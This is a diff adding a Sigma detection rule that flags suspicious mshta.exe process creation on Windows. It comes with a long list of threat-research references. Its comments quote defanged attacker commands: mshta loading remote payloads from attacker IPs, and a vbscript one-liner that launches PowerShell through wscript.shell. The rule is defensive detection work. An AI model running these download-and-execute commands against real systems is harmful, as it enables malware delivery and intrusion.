@@ -1,0 +1,183 @@
+id: Z3VKB8NqEBrD
+name: Suspicious LOLBAS MSHTA Defense Evasion Behavior by Detection of Associated Commands (via process_creation)
+body: |-
+  title: Suspicious LOLBAS MSHTA Defense Evasion Behavior by Detection of Associated Commands (via process_creation)
+  id: e70092a5-1b91-4a90-9a32-8b94307c9147
+  status: stable
+  description: Detects use of mshta as a living off the land technique.
+  references:
+      - https://asec.ahnlab.com/en/96295/
+      - https://www.welivesecurity.com/en/eset-research/eset-apt-activity-report-q2-2026-q3-2026/
+      - https://www.huntress.com/blog/you-can-run-but-you-cant-hide-defender-exclusions
+      - https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/
+      - https://www.malware-traffic-analysis.net/2026/09/15/index.html
+      - https://www.trellix.com/blogs/research/sidecopy-threat-intel-mshta-execution-rat-deployment/
+      - https://www.hudsonrock.com/blog/hbo-max-ads-on-a-compromised-reddit-account-exposed-a-massive-pasteswitch-clickfix-operation
+      - https://www.fortinet.com/blog/threat-research/casbaneiro-a-banking-trojan-with-distributed-data-receiving-servers
+      - https://www.cyderes.com/howler-cell/job-offer-attack-chains-analysis
+      - https://www.netskope.com/jp/blog/malware-on-the-blockchain-an-ongoing-campaigns-new-webrtc-twist
+      - https://asec.ahnlab.com/en/95171/
+      - https://asec.ahnlab.com/en/94552/
+      - https://redcanary.com/blog/threat-intelligence/intelligence-insights-july-2026/
+      - https://www.rapid7.com/blog/post/tr-exposed-webdav-malware-delivery-lab-analysis/
+      - https://blog.talosintelligence.com/uat-11795-deploys-novel-starland-rat-and-bespoke-wldr-c2-implant-in-financially-motivated-campaign/
+      - https://www.microsoft.com/en-us/security/blog/2026/07/16/acr-stealer-two-observed-intrusion-chains-amid-increased-threat-activity/
+      - https://blogs.jpcert.or.jp/en/2026/07/apt-c-60_2026.html
+      - https://asec.ahnlab.com/en/94432/
+      - https://www.picussecurity.com/resource/blog/gamaredon-primitive-bear-apt-profile-and-mitre-attck-breakdown
+      - https://cloud.google.com/blog/topics/threat-intelligence/stockstay-turla-intelligence-gathering
+      - https://www.huntress.com/blog/potemkin-loader-rmmproject-clickfix-attack
+      - https://www.trendmicro.com/en_us/research/26/f/old-winrar-flaw-fuels-attacks-on-ukraine.html
+      - https://blog.sekoia.io/fsbs-matryoshka-1-3-gamaredons-gifts-that-keeps-unpacking-gammaphish-and-gammaworm/
+      - https://www.seqrite.com/blog/operation-xenofiscal-sidecopy-deploying-persistent-xenorat-targeting-the-mof-afghanistan/
+      - https://asec.ahnlab.com/en/93855/
+      - https://www.bitdefender.com/en-us/blog/labs/microsofts-mshta-legacy-malware-windows
+      - https://isc.sans.edu/diary/rss/33018
+      - https://blog.synapticsystems.de/uac-0247-malware-targeting-fpv-operators/
+      - https://www.esentire.com/blog/amatera-stealer-4-0-2-beta-whats-new-in-this-variant
+      - https://blog.synapticsystems.de/uac-0184-from-hta-to-a-signed-network-stack/
+      - https://www.trendmicro.com/en_us/research/26/e/installfix-and-claude-code.html
+      - https://cert.gov.ua/article/6288271
+      - https://cert.gov.ua/article/6286219
+      - https://www.trellix.com/blogs/research/xworm-v6-exploring-pivotal-plugins/
+      - https://www.seqrite.com/blog/judicial-notification-phish-colombia-svg-asyncrat/
+      - https://www.zscaler.com/blogs/security-research/apt37-targets-windows-rust-backdoor-and-python-loader
+      - https://cert.gov.ua/article/6284949
+      - https://www.recordedfuture.com/research/drat-v2-updated-drat-emerges-tag-140s-arsenal
+      - https://www.reliaquest.com/blog/threat-spotlight-cyber-attacker-techniques-dec-2024-to-feb-2025/
+      - https://cert.gov.ua/article/6282536
+      - https://cert.gov.ua/article/6282517
+      - https://asec.ahnlab.com/en/86098/
+      - https://cert.gov.ua/article/6281681
+      - https://www.fortinet.com/blog/threat-research/sophisticated-attack-targets-taiwan-with-smokeloader
+      - https://www.recordedfuture.com/research/russia-aligned-tag-110-targets-asia-and-europe
+      - https://cert.gov.ua/article/6281123
+      - https://harfanglab.io/insidethelab/hijackloader-abusing-genuine-certificates/
+      - https://www.welivesecurity.com/en/eset-research/cyberespionage-gamaredon-way-analysis-toolset-used-spy-ukraine-2022-2023/
+      - https://intezer.com/blog/research/cryptbot-yet-another-silly-stealer-yass/
+      - https://app.any.run/tasks/b3b44103-02fe-4b04-821f-094edd5e82c7/
+      - https://securityintelligence.com/x-force/hive0051-all-in-triple-threat/
+      - https://asec.ahnlab.com/ko/62771/
+      - https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-060a
+      - https://cert.gov.ua/article/6276988
+      - https://cert.gov.ua/article/5661411
+      - https://blog.eclecticiq.com/german-embassy-lure-likely-part-of-campaign-against-nato-aligned-ministries-of-foreign-affairs
+      - https://app.any.run/tasks/d5b3954c-d5d2-4894-8a2a-36625f7fa00c
+      - https://www.trellix.com/en-us/about/newsroom/stories/research/beyond-file-search-a-novel-method.html
+      - https://www.zscaler.com/blogs/security-research/hibernating-qakbot-comprehensive-study-and-depth-campaign-analysis
+      - https://asec.ahnlab.com/en/55219/
+      - https://cert.gov.ua/article/4818341
+      - https://badoption.eu/blog/2023/06/01/zipjar.html
+      - https://www.sentinelone.com/labs/kimsuky-evolves-reconnaissance-capabilities-in-new-global-campaign/
+      - https://cert.gov.ua/article/2681855
+      - https://cert.gov.ua/article/971405
+      - https://cert.gov.ua/article/39138
+      - https://cert.gov.ua/article/37829
+      - https://lolbas-project.github.io/lolbas/Binaries/Mshta/
+      - https://asec.ahnlab.com/ko/56654/
+      - https://cyble.com/blog/unveiling-the-stealthy-exploitation-of-microsoft-cmstp-using-malicious-lnk-files/
+      - https://thedfirreport.com/2023/12/04/sql-brute-force-leads-to-bluesky-ransomware/
+      - https://www.rapid7.com/blog/post/2024/01/17/whispers-of-atlantida-safeguarding-your-digital-treasure/
+      - https://asec.ahnlab.com/en/60805/
+      - https://www.zscaler.com/blogs/security-research/european-diplomats-targeted-spikedwine-wineloader
+      - https://www.kroll.com/en/insights/publications/cyber/screenconnect-vulnerability-exploited-to-deploy-babyshark
+      - https://blog.talosintelligence.com/coralraider-targets-socialmedia-accounts/
+      - https://www.splunk.com/en_us/blog/security/wineloader-analysis.html
+      - https://blog.talosintelligence.com/suspected-coralraider-continues-to-expand-victimology-using-three-information-stealers/
+      - https://www.seqrite.com/blog/pakistani-apts-escalate-attacks-on-indian-gov-seqrite-labs-unveils-threats-and-connections/
+      - https://www.binarydefense.com/resources/blog/wineloader-analysis-of-the-infection-chain/
+      - https://www.imperva.com/blog/update-cve-2024-4577-quickly-weaponized-to-distribute-tellyouthepass-ransomware/
+      - https://assets.sentinelone.com/sentinellabs/chamelgang-friends-en
+      - https://cyble.com/blog/investigating-the-new-jellyfish-loader/
+      - https://www.fortinet.com/blog/threat-research/exploiting-cve-2024-21412-stealer-campaign-unleashed
+      - https://research.checkpoint.com/2024/stargazers-ghost-network/
+      - https://blog.talosintelligence.com/chinese-hacking-group-apt41-compromised-taiwanese-government-affiliated-research-institute-with-shadowpad-and-cobaltstrike-2/
+      - https://cloud.google.com/blog/topics/threat-intelligence/peaklight-decoding-stealthy-memory-only-malware/
+      - https://www.esentire.com/blog/go-injector-leading-to-stealers
+      - https://www.securonix.com/blog/shroudedsleep-a-deep-dive-into-north-koreas-ongoing-campaign-against-southeast-asia/
+      - https://notes.netbytesec.com/2024/10/lemonduck-unleashes-cryptomining.html
+      - https://www.attackiq.com/2024/10/15/emulating-lumma-stealer/
+      - https://blog.qualys.com/vulnerabilities-threat-research/2024/10/20/unmasking-lumma-stealer-analyzing-deceptive-tactics-with-fake-captcha
+      - https://www.fortinet.com/blog/threat-research/new-campaign-uses-remcos-rat-to-exploit-victims
+      - https://cert.gov.ua/article/6281632
+      - https://blog.sekoia.io/double-tap-campaign-russia-nexus-apt-possibly-related-to-apt2[…]spionage-on-central-asia-and-kazakhstan-diplomatic-relations/
+      - https://asec.ahnlab.com/en/85798/
+      - https://www.bitdefender.com/en-us/blog/businessinsights/uac-0063-cyber-espionage-operation-expanding-from-central-asia
+      - https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/
+      - https://www.seqrite.com/blog/steganographic-campaign-distributing-malware/
+      - https://www.security.com/threat-intelligence/shuckworm-ukraine-gammasteel
+      - https://blog.sekoia.io/detecting-multi-stage-infection-chains-madness/
+      - https://blog.qualys.com/vulnerabilities-threat-research/2025/05/15/fileless-execution-powershell-based-shellcode-loader-executes-remcos-rat
+      - https://www.proofpoint.com/us/blog/threat-insight/call-it-what-you-want-threat-actor-delivers-highly-targeted-multistage-polyglot
+      - https://unit42.paloaltonetworks.com/kimjongrat-stealer-variant-powershell/
+      - https://www.fortinet.com/blog/threat-research/norddragonscan-quiet-data-harvester-on-windows
+      - https://www.nccgroup.com/us/research-blog/fake-captcha-led-to-lumma100725/
+      - https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/
+      - https://www.silentpush.com/blog/countloader/
+      - https://www.mcafee.com/blogs/other-blogs/mcafee-labs/astaroth-banking-trojan-abusing-github-for-resilience/
+      - https://cloud.google.com/blog/topics/threat-intelligence/unc5142-etherhiding-distribute-malware/
+      - https://arcticwolf.com/resources/blog/unc6384-weaponizes-zdi-can-25373-vulnerability-to-deploy-plugx/
+      - https://www.esentire.com/blog/evalusion-campaign-delivers-amatera-stealer-and-netsupport-rat
+      - https://www.enki.co.kr/en/media-center/blog/kimsuky-s-ongoing-evolution-of-kimjongrat-and-expanding-threats
+      - https://www.trendmicro.com/en_us/research/25/l/water-saci.html
+      - https://www.acronis.com/en/tru/posts/fake-adult-websites-pop-realistic-windows-update-screen-to-deliver-stealers-via-clickfix/
+      - https://www.morphisec.com/blog/pystorerat-a-new-ai-driven-supply-chain-malware-campaign-targeting-it-osint-professionals/
+      - https://www.pointwild.com/threat-intelligence/clickfix-darkgate
+      - https://www.cyfirma.com/research/apt36-multi-stage-lnk-malware-campaign-targeting-indian-government-entities/
+      - https://blog.synapticsystems.de/inside-gamaredon-2025-zero-click-espionage-at-scale/
+      - https://blog.synapticsystems.de/gamaredon-now-downloading-via-windows-updates-best-friend/
+      - https://www.trendmicro.com/en_us/research/26/a/peckbirdy-script-framework.html
+      - https://cloud.google.com/blog/topics/threat-intelligence/unc1069-targets-cryptocurrency-ai-social-engineering/
+      - https://www.fortinet.com/blog/threat-research/deep-dive-into-new-xworm-campaign-utilizing-multiple-themed-phishing-emails
+      - https://www.magicsword.io/blog/apple-ios-certificate-windows-malware
+      - https://isc.sans.edu/diary/rss/32726
+      - https://pushsecurity.com/blog/installfix/
+      - https://isc.sans.edu/diary/32796
+      - https://www.malwarebytes.com/blog/threat-intel/2026/03/hacked-sites-deliver-vidar-infostealer-to-windows-users
+      - https://www.esentire.com/blog/etherrat-sys-info-module-c2-on-ethereum-etherhiding-target-selection-cdn-like-beacons
+      - https://redcanary.com/blog/threat-intelligence/scarlet-goldfinch-clickfix/
+  author: SOC Prime Team
+  tags:
+      - attack.defense_evasion
+      - attack.execution
+      - attack.t1218.005
+      - attack.t1204.004
+  logsource:
+      category: process_creation
+      product: windows
+  detection:
+      selection_parent_image:
+          ParentImage|endswith: 'mshta.exe'
+      selection_image:
+          Image|endswith: 'mshta.exe'
+      selection_cmdline:
+          - CommandLine|endswith:
+              - '.hta' # malicious HTA in %TEMP% https://asec.ahnlab.com/en/96295/; mshta.exe hXXps://secfileshare[.]com/4.hta; https://cert.gov.ua/article/6284949; https://cert.gov.ua/article/6286219; https://isc.sans.edu/diary/32796; https://cert.gov.ua/article/6288271; https://blog.synapticsystems.de/uac-0184-from-hta-to-a-signed-network-stack/; https://asec.ahnlab.com/en/93855/; https://blog.talosintelligence.com/uat-11795-deploys-novel-starland-rat-and-bespoke-wldr-c2-implant-in-financially-motivated-campaign/; https://asec.ahnlab.com/en/94552/; https://asec.ahnlab.com/en/95171/; https://www.hudsonrock.com/blog/hbo-max-ads-on-a-compromised-reddit-account-exposed-a-massive-pasteswitch-clickfix-operation; https://www.trellix.com/blogs/research/sidecopy-threat-intel-mshta-execution-rat-deployment/; https://www.malware-traffic-analysis.net/2026/09/15/index.html; https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/
+              - '.xll' #mshta hxxp://80.64[.]30.238/evil.xll; https://cloud.google.com/blog/topics/threat-intelligence/unc5142-etherhiding-distribute-malware/
+              - '.mp4' #mshta hxxp://80.64[.]30.238/evil.mp4; https://cloud.google.com/blog/topics/threat-intelligence/unc5142-etherhiding-distribute-malware/
+              - '.mp3' #mshta hxxp://80.64[.]30.238/evil.mp3; https://cloud.google.com/blog/topics/threat-intelligence/unc5142-etherhiding-distribute-malware/
+              - '.wav' #mshta hxxp://80.64[.]30.238/evil.wav; https://cloud.google.com/blog/topics/threat-intelligence/unc5142-etherhiding-distribute-malware/
+              - '.dat' #mshta hxxp://80.64[.]30.238/evil.dat; https://cloud.google.com/blog/topics/threat-intelligence/unc5142-etherhiding-distribute-malware/
+              - '.odd' #mshta hxxp://23.254.243[.]4/pjdl.odd; https://www.acronis.com/en/tru/posts/fake-adult-websites-pop-realistic-windows-update-screen-to-deliver-stealers-via-clickfix/
+          - CommandLine|contains:
+              - '\\'
+              - 'wscript'
+              - 'CreateObject'
+              - 'ActiveXObject'
+              - 'vbscript' #mshta vbscript:close(createobject("wscript.shell").run("powershell $ProgressPreference = 'SilentlyContinue';...; https://www.bitdefender.com/en-us/blog/labs/microsofts-mshta-legacy-malware-windows
+              - 'javascript' #https://www.magicsword.io/blog/apple-ios-certificate-windows-malware ; https://blogs.jpcert.or.jp/en/2026/07/apt-c-60_2026.html
+              - 'http' #https://cert.gov.ua/article/6284949 mshta.exe hXXps://secfileshare[.]com/4.hta; https://www.zscaler.com/blogs/security-research/apt37-targets-windows-rust-backdoor-and-python-loader; https://cert.gov.ua/article/6286219; https://cloud.google.com/blog/topics/threat-intelligence/unc1069-targets-cryptocurrency-ai-social-engineering/; https://www.trendmicro.com/en_us/research/26/e/installfix-and-claude-code.html ;https://blog.synapticsystems.de/uac-0247-malware-targeting-fpv-operators/; https://isc.sans.edu/diary/rss/33018; https://www.microsoft.com/en-us/security/blog/2026/07/16/acr-stealer-two-observed-intrusion-chains-amid-increased-threat-activity/; https://www.rapid7.com/blog/post/tr-exposed-webdav-malware-delivery-lab-analysis/; https://www.netskope.com/jp/blog/malware-on-the-blockchain-an-ongoing-campaigns-new-webrtc-twist; https://www.cyderes.com/howler-cell/job-offer-attack-chains-analysis
+              - 'close' #https://www.mcafee.com/blogs/other-blogs/mcafee-labs/astaroth-banking-trojan-abusing-github-for-resilience/
+              - 'DavWWWRoot' #mshta \\dbexport.zip\DavWWWRoot\calc_hta.hta
+      filters_chain1:
+          ParentImage|endswith: 'TeamViewer.exe' #"C:\Windows\system32\mshta.exe" C:\Users\xxx\AppData\Local\Temp\TeamViewer\TeamViewer11_Exit.hta
+          CommandLine|contains|all:
+              - '\TeamViewer'
+              - '_Exit.hta'
+      condition: ((selection_image and selection_cmdline) and not filters_chain1) or selection_parent_image
+  falsepositives:
+      - unknown
+  level: high
+level: high
+created: '2020-05-25T15:19:29Z'
+updated: '2026-11-02T13:15:49.497000Z'
